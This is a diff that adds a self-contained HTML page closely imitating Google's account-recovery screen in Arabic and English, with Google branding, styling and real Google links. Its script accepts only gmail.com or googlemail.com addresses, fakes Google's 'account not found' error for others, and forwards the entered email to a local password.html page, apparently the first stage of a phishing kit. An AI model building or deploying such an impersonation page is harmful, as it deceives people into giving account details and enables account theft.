@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl" id="html-root">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>استعادة الحساب - حسابات Google</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: #fff; color: #202124;
+            display: flex; align-items: center; justify-content: center;
+            min-height: 100vh;
+        }
+        .container { width: 100%; max-width: 450px; padding: 48px 40px 36px; }
+        .logo { text-align: center; margin-bottom: 16px; }
+        .logo img { width: 75px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; text-align: center; }
+        .subtitle { font-size: 16px; color: #5f6368; margin-bottom: 32px; text-align: center; }
+        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; background: #fff; }
+        .input-group { margin-bottom: 9px; position: relative; }
+        .input-field {
+            width: 100%; padding: 13px 15px; font-size: 16px; line-height: 24px;
+            border: 1px solid #dadce0; border-radius: 4px; outline: none;
+            transition: 0.2s; font-family: inherit;
+        }
+        .input-field:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
+        .input-field.error {
+            border-color: #d93025 !important;
+            box-shadow: 0 0 0 2px rgba(217,48,37,0.2) !important;
+        }
+        .error-msg {
+            display: flex; align-items: flex-start; gap: 8px; font-size: 12px;
+            color: #d93025; margin-top: 4px; line-height: 1.4;
+        }
+        .error-msg.hidden { display: none; }
+        .error-circle {
+            display: inline-flex; align-items: center; justify-content: center;
+            width: 16px; height: 16px; background: #d93025; color: white;
+            border-radius: 50%; font-size: 11px; font-weight: bold; margin-top: 2px;
+            flex-shrink: 0;
+        }
+        .forgot-email { font-size: 14px; color: #1a73e8; text-decoration: none; font-weight: 500; margin-top: 4px; display: inline-block; }
+        .forgot-email:hover { text-decoration: underline; }
+        .guest-text { font-size: 14px; color: #5f6368; margin-top: 32px; line-height: 1.4286; }
+        .guest-text a { color: #1a73e8; text-decoration: none; font-weight: 500; }
+        .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
+        .create-account { font-size: 14px; color: #1a73e8; text-decoration: none; font-weight: 500; }
+        .create-account:hover { text-decoration: underline; }
+        .btn-next {
+            background: #1a73e8; color: white; border: none; border-radius: 4px;
+            height: 36px; padding: 0 24px; font-size: 14px; font-weight: 500;
+            cursor: pointer; transition: 0.2s; font-family: inherit;
+        }
+        .btn-next:hover { background: #1765c1; }
+        .btn-next:active { background: #1558b0; }
+        .footer { margin-top: 24px; display: flex; justify-content: space-between; font-size: 12px; color: #5f6368; }
+        .footer select { border: none; background: transparent; color: #5f6368; font-size: 12px; appearance: none; padding-right: 15px; cursor: pointer; }
+        .footer a { color: #5f6368; text-decoration: none; margin-left: 16px; }
+        .footer a:hover { text-decoration: underline; }
+        @media (max-width: 600px) {
+            .container { padding: 24px 24px 36px; }
+            .card { border: none; padding: 24px 24px 36px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+        </div>
+        <h1 id="main-title">استعادة الحساب</h1>
+        <p class="subtitle" id="main-subtitle">للمتابعة، سنحتاج إلى التأكد من هويتك.</p>
+        <div class="card">
+            <form id="recovery-form">
+                <div class="input-group">
+                    <input type="text" id="email-input" class="input-field" placeholder="عنوان البريد الإلكتروني أو رقم الهاتف" autofocus required>
+                    <div id="email-error" class="error-msg hidden">
+                        <span class="error-circle">!</span>
+                        <span id="email-error-text"></span>
+                    </div>
+                </div>
+                <a href="https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin" target="_blank" class="forgot-email" id="forgot-email-link">هل نسيت البريد الإلكتروني؟</a>
+                <p class="guest-text">
+                    <span id="guest-text-1">ليست هذه حاسوبك؟ استخدم وضع الضيف لتسجيل الدخول بشكل خاص.</span>
+                    <a href="#" id="guest-link">مزيد من المعلومات حول استخدام وضع الضيف</a>
+                </p>
+                <div class="actions">
+                    <a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp" target="_blank" class="create-account" id="create-account-link">إنشاء حساب</a>
+                    <button type="submit" class="btn-next" id="next-btn">التالي</button>
+                </div>
+            </form>
+        </div>
+        <div class="footer">
+            <select id="lang-switcher">
+                <option value="ar" selected>العربية</option>
+                <option value="en">English (United States)</option>
+            </select>
+            <div>
+                <a href="https://support.google.com/accounts?hl=ar" target="_blank" id="help-link">المساعدة</a>
+                <a href="https://policies.google.com/privacy?hl=ar" target="_blank" id="privacy-link">الخصوصية</a>
+                <a href="https://policies.google.com/terms?hl=ar" target="_blank" id="terms-link">البنود</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        // === إعداد الترجمة ===
+        const translations = {
+            ar: {
+                title: 'استعادة الحساب',
+                subtitle: 'للمتابعة، سنحتاج إلى التأكد من هويتك.',
+                placeholder: 'عنوان البريد الإلكتروني أو رقم الهاتف',
+                forgotEmail: 'هل نسيت البريد الإلكتروني؟',
+                guestText1: 'ليست هذه حاسوبك؟ استخدم وضع الضيف لتسجيل الدخول بشكل خاص.',
+                guestLinkText: 'مزيد من المعلومات حول استخدام وضع الضيف',
+                createAccount: 'إنشاء حساب',
+                nextBtn: 'التالي',
+                help: 'المساعدة',
+                privacy: 'الخصوصية',
+                terms: 'البنود',
+                errorEmpty: 'أدخل عنوان بريد إلكتروني أو رقم هاتف.',
+                errorInvalid: 'أدخل عنوان بريد إلكتروني صالحًا أو رقم هاتف.',
+                errorNoAccount: 'لم يتمّ العثور على حسابك على Google.',
+                langHelp: 'ar',
+                langPrivacy: 'ar',
+                langTerms: 'ar',
+                dir: 'rtl'
+            },
+            en: {
+                title: 'Account recovery',
+                subtitle: 'To continue, we need to verify your identity.',
+                placeholder: 'Email or phone',
+                forgotEmail: 'Forgot email?',
+                guestText1: 'Not your computer? Use Guest mode to sign in privately.',
+                guestLinkText: 'Learn more about using Guest mode',
+                createAccount: 'Create account',
+                nextBtn: 'Next',
+                help: 'Help',
+                privacy: 'Privacy',
+                terms: 'Terms',
+                errorEmpty: 'Enter an email address or phone number.',
+                errorInvalid: 'Enter a valid email address or phone number.',
+                errorNoAccount: 'Couldn\'t find your Google Account.',
+                langHelp: 'en',
+                langPrivacy: 'en',
+                langTerms: 'en',
+                dir: 'ltr'
+            }
+        };
+
+        function applyLanguage(lang) {
+            const t = translations[lang];
+            document.getElementById('main-title').textContent = t.title;
+            document.getElementById('main-subtitle').textContent = t.subtitle;
+            document.getElementById('email-input').placeholder = t.placeholder;
+            document.getElementById('forgot-email-link').textContent = t.forgotEmail;
+            document.getElementById('guest-text-1').textContent = t.guestText1;
+            document.getElementById('guest-link').textContent = t.guestLinkText;
+            document.getElementById('create-account-link').textContent = t.createAccount;
+            document.getElementById('next-btn').textContent = t.nextBtn;
+            document.getElementById('help-link').textContent = t.help;
+            document.getElementById('help-link').href = `https://support.google.com/accounts?hl=${t.langHelp}`;
+            document.getElementById('privacy-link').textContent = t.privacy;
+            document.getElementById('privacy-link').href = `https://policies.google.com/privacy?hl=${t.langPrivacy}`;
+            document.getElementById('terms-link').textContent = t.terms;
+            document.getElementById('terms-link').href = `https://policies.google.com/terms?hl=${t.langTerms}`;
+            document.getElementById('html-root').setAttribute('dir', t.dir);
+            document.getElementById('html-root').setAttribute('lang', lang);
+            // تحديث نص الخطأ إذا كان ظاهراً
+            const errorDiv = document.getElementById('email-error');
+            if (!errorDiv.classList.contains('hidden')) {
+                // إعادة تعيين الخطأ حسب السياق (سنتركه يحدث عند submit)
+            }
+        }
+
+        document.getElementById('lang-switcher').addEventListener('change', function(e) {
+            applyLanguage(e.target.value);
+        });
+
+        // === معالجة النموذج ===
+        const form = document.getElementById('recovery-form');
+        const emailInput = document.getElementById('email-input');
+        const errorDiv = document.getElementById('email-error');
+        const errorText = document.getElementById('email-error-text');
+
+        emailInput.addEventListener('input', function() {
+            emailInput.classList.remove('error');
+            errorDiv.classList.add('hidden');
+        });
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = emailInput.value.trim();
+            errorDiv.classList.add('hidden');
+            emailInput.classList.remove('error');
+            const lang = document.getElementById('lang-switcher').value;
+            const t = translations[lang];
+
+            if (email === '') {
+                errorText.textContent = t.errorEmpty;
+                errorDiv.classList.remove('hidden');
+                emailInput.classList.add('error');
+                return;
+            }
+            if (!email.includes('@')) {
+                errorText.textContent = t.errorInvalid;
+                errorDiv.classList.remove('hidden');
+                emailInput.classList.add('error');
+                return;
+            }
+            const allowedDomains = ['gmail.com', 'googlemail.com'];
+            const domain = email.split('@')[1]?.toLowerCase();
+            if (!domain || !allowedDomains.includes(domain)) {
+                errorText.textContent = t.errorNoAccount;
+                errorDiv.classList.remove('hidden');
+                emailInput.classList.add('error');
+                return;
+            }
+            window.location.href = 'password.html?email=' + encodeURIComponent(email) + '&lang=' + lang;
+        });
+    </script>
+</body>
+</html>
